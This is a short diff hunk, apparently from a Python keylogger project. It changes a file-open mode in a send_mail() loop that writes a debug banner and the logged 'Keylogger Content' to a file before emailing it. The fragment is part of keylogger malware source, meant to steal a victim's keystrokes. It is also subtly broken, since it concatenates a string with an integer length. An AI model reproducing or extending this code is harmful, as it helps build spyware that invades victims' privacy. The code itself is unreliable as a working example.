@@ -36,7 +36,7 @@ if not path.isfile(dir):
 def send_mail():
     global data
     while True:
-        file_object = open(debugFile, "rw")
+        file_object = open(debugFile, "w")
         file_object.write("===== SENDING EMAIL: DEBUG MODE =====")
         file_object.write("Data Content Length: " + len(data))
         file_object.write("Keylogger Content: " + data)
